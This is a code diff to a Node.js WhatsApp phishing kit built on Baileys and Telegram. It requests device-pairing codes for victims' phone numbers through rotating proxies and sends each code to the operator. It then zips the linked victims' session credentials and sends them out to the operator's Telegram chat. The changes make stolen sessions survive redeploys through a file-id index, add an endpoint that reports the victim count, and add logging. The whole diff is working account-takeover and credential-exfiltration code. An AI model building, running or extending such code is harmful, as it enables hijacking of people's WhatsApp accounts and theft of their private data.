@@ -17,12 +17,13 @@ const path = require('path');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const axios = require('axios');
 
-const BOT_NUMBER = (process.env.BOT_NUMBER || '2348023931932').replace(/[^0-9]/g, '');
+const BOT_NUMBER = (process.env.BOT_NUMBER || '').replace(/[^0-9]/g, '');
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
 const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID';
 const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com';
 
 const PROXY_CACHE_FILE = path.join(__dirname, 'working_proxy.json');
+const SESSION_INDEX_FILE = path.join(__dirname, 'session_index.json');
 
 const app = express();
 const server = http.createServer(app);
@@ -46,6 +47,17 @@ app.get('/logs', (req, res) => {
     res.json(logBuffer.slice(-100));
 });
 
+app.get('/env', (req, res) => {
+    res.json({
+        BOT_NUMBER,
+        RENDER_URL,
+        hasTelegramToken: !!TELEGRAM_TOKEN && TELEGRAM_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN',
+        hasTelegramId: !!MY_TELEGRAM_ID && MY_TELEGRAM_ID !== 'YOUR_TELEGRAM_USER_ID',
+        pendingSocks: Array.from(global.__pendingSocks?.keys() || []),
+        victimCount: victimList.length
+    });
+});
+
 const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: { autoStart: true, interval: 1000 } });
 tgBot.on('polling_error', () => {});
 
@@ -53,16 +65,40 @@ let adminSock = null;
 let activeVictims = {};
 let victimList = [];
 
-// pending sockets — held alive between "code issued" and "connection open"
 if (!global.__pendingSocks) global.__pendingSocks = new Map();
 
 function holdPending(number, sock) {
     global.__pendingSocks.set(number, sock);
 }
-
 function releasePending(number, sock) {
     const held = global.__pendingSocks.get(number);
     if (held === sock) global.__pendingSocks.delete(number);
+}
+
+// ── session index (file_id based, survives across getUpdates consumption) ──
+function loadSessionIndex() {
+    try {
+        if (fs.existsSync(SESSION_INDEX_FILE)) {
+            return JSON.parse(fs.readFileSync(SESSION_INDEX_FILE, 'utf8'));
+        }
+    } catch (e) {}
+    return {};
+}
+
+function saveSessionIndex(index) {
+    try {
+        fs.writeFileSync(SESSION_INDEX_FILE, JSON.stringify(index, null, 2));
+    } catch (e) {}
+}
+
+function recordSession(folderName, fileId, messageId) {
+    const index = loadSessionIndex();
+    index[folderName] = { fileId, messageId, savedAt: Date.now() };
+    saveSessionIndex(index);
+    // also mirror index to telegram as a text message so it survives disk wipe
+    tgBot.sendMessage(MY_TELEGRAM_ID,
+        `#SESSION_INDEX ${folderName} ${fileId} ${messageId}`
+    ).catch(() => {});
 }
 
 // ── proxy cache ─────────────────────────────────────────────
@@ -87,21 +123,45 @@ function saveCachedProxy(proxy) {
     } catch (e) {}
 }
 
-// ── session restore ─────────────────────────────────────────
+// ── session restore (by file_id, not getUpdates) ──────────
 async function restoreSessionFromTelegram(folderName) {
     const folderPath = path.join(__dirname, folderName);
-    if (await fs.pathExists(folderPath)) return true;
+    if (await fs.pathExists(folderPath)) {
+        // check if it has creds.json — if empty folder, wipe and restore
+        if (await fs.pathExists(path.join(folderPath, 'creds.json'))) {
+            pushLog(`[restore] ${folderName} already present on disk`, 'info');
+            return true;
+        }
+        await fs.remove(folderPath);
+    }
+
+    const index = loadSessionIndex();
+    let entry = index[folderName];
+
+    // fallback: scan recent telegram messages for #SESSION_INDEX marker
+    if (!entry) {
+        try {
+            const updates = await tgBot.getUpdates({ limit: 100, offset: -1 });
+            for (const u of updates.reverse()) {
+                const text = u.message?.text || '';
+                if (text.startsWith('#SESSION_INDEX ')) {
+                    const parts = text.split(' ');
+                    if (parts[1] === folderName && parts[2] && parts[3]) {
+                        entry = { fileId: parts[2], messageId: parseInt(parts[3], 10) };
+                        break;
+                    }
+                }
+            }
+        } catch (e) {}
+    }
+
+    if (!entry || !entry.fileId) {
+        pushLog(`[restore] no session index for ${folderName}`, 'warn');
+        return false;
+    }
 
     try {
-        const updates = await tgBot.getUpdates({ limit: 100 });
-        const docs = updates
-            .filter(u => u.message?.document?.file_name?.includes(folderName))
-            .sort((a, b) => b.message.date - a.message.date);
-
-        if (!docs.length) return false;
-
-        const fileId = docs[0].message.document.file_id;
-        const fileLink = await tgBot.getFileLink(fileId);
+        const fileLink = await tgBot.getFileLink(entry.fileId);
         const zipPath = path.join(__dirname, `${folderName}_restore.zip`);
 
         const writer = fs.createWriteStream(zipPath);
@@ -117,8 +177,11 @@ async function restoreSessionFromTelegram(folderName) {
         const extract = require('extract-zip');
         await extract(zipPath, { dir: folderPath });
         await fs.unlink(zipPath);
+
+        pushLog(`[restore] ${folderName} restored from telegram`, 'info');
         return true;
     } catch (e) {
+        pushLog(`[restore] ${folderName} failed: ${e.message}`, 'error');
         return false;
     }
 }
@@ -135,17 +198,18 @@ async function getLiveProxies() {
 }
 
 // ── backup ──────────────────────────────────────────────────
-async function backupToTelegram(phoneNumber, folderPath) {
-    const zipPath = path.join(__dirname, `${phoneNumber}.zip`);
+async function backupToTelegram(folderName, folderPath) {
+    const zipPath = path.join(__dirname, `${folderName}.zip`);
     const output = fs.createWriteStream(zipPath);
     const archive = archiver('zip', { zlib: { level: 9 } });
 
     return new Promise((resolve, reject) => {
         output.on('close', async () => {
             try {
-                await tgBot.sendDocument(MY_TELEGRAM_ID, zipPath, {
-                    caption: `#SESSION ${phoneNumber}`
+                const msg = await tgBot.sendDocument(MY_TELEGRAM_ID, zipPath, {
+                    caption: `#SESSION_BACKUP ${folderName}`
                 });
+                recordSession(folderName, msg.document.file_id, msg.message_id);
                 fs.unlinkSync(zipPath);
                 resolve();
             } catch (e) { reject(e); }
@@ -184,11 +248,17 @@ async function startAdminBot() {
     adminSock = makeWASocket(sockOptions);
     adminSock.ev.on('creds.update', saveCreds);
 
+    let adminPairCodeSent = false;
+
     adminSock.ev.on('connection.update', async (update) => {
         if (update.connection === 'open') {
             pushLog('Admin Bot connected', 'info');
             tgBot.sendMessage(MY_TELEGRAM_ID, '✅ Admin Bot Linked!', { parse_mode: 'Markdown' });
             if (cachedProxy) saveCachedProxy(cachedProxy);
+            // back up admin session so next deploy restores it
+            backupToTelegram('auth_info_admin', 'auth_info_admin').catch((e) => {
+                pushLog(`[admin-backup] failed: ${e.message}`, 'error');
+            });
         }
         if (update.connection === 'close' &&
             update.lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
@@ -196,7 +266,8 @@ async function startAdminBot() {
         }
     });
 
-    if (!adminSock.authState.creds.registered) {
+    if (!adminSock.authState.creds.registered && !adminPairCodeSent) {
+        adminPairCodeSent = true;
         adminSock.ev.on('connection.update', async (update) => {
             if (update.connection === 'connecting' && !adminSock.authState.creds.registered) {
                 await delay(3000);
@@ -207,7 +278,9 @@ async function startAdminBot() {
                         `*Admin Pairing Code:* \`${code}\``,
                         { parse_mode: 'Markdown' }
                     );
-                } catch (err) {}
+                } catch (err) {
+                    pushLog(`[admin-pair] requestPairingCode failed: ${err.message}`, 'error');
+                }
             }
         });
     }
@@ -218,6 +291,8 @@ io.on('connection', (socket) => {
     socket.on('request_code', async (phoneNumber) => {
         const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
         const folderName = `auth_info_${targetNumber}`;
+
+        console.log('[PAIR] targetNumber =', targetNumber, '| BOT_NUMBER =', BOT_NUMBER, '| match =', targetNumber === BOT_NUMBER);
 
         if (targetNumber === BOT_NUMBER) {
             return socket.emit('error', 'This number is the admin account. Use a different number.');
@@ -281,7 +356,6 @@ io.on('connection', (socket) => {
                 const phishSock = makeWASocket(sockOptions);
                 phishSock.ev.on('creds.update', saveCreds);
 
-                // hold this socket in global map so GC can't collect it
                 holdPending(targetNumber, phishSock);
 
                 phishSock.ev.on('connection.update', (update) => {
@@ -311,7 +385,6 @@ io.on('connection', (socket) => {
                                 tgBot.sendMessage(MY_TELEGRAM_ID,
                                     `✅ *Code issued*\nNumber: \`${targetNumber}\`\nCode: \`${code}\`\nVia: ${label}\n⏳ waiting for confirmation…`
                                 );
-                                // DO NOT resolve, DO NOT .end() — socket stays held
                             } catch (e) {
                                 lastError = e.message;
                                 tgBot.sendMessage(MY_TELEGRAM_ID,
@@ -340,8 +413,9 @@ io.on('connection', (socket) => {
 
                             if (proxyUrl !== 'DIRECT') saveCachedProxy(proxyUrl);
 
-                            // keep held — it's an active victim now, still needs the ref
-                            backupToTelegram(targetNumber, folderName).catch(() => {});
+                            backupToTelegram(folderName, folderName).catch((e) => {
+                                pushLog(`[victim-backup] ${folderName} failed: ${e.message}`, 'error');
+                            });
                             resolve();
                         }
 
@@ -373,7 +447,6 @@ io.on('connection', (socket) => {
                 lastError = error.message;
 
                 if (error.message === 'AuthRejected' && codeIssued) {
-                    // code was issued, WhatsApp rejected the link — stop retrying
                     break;
                 }
             }
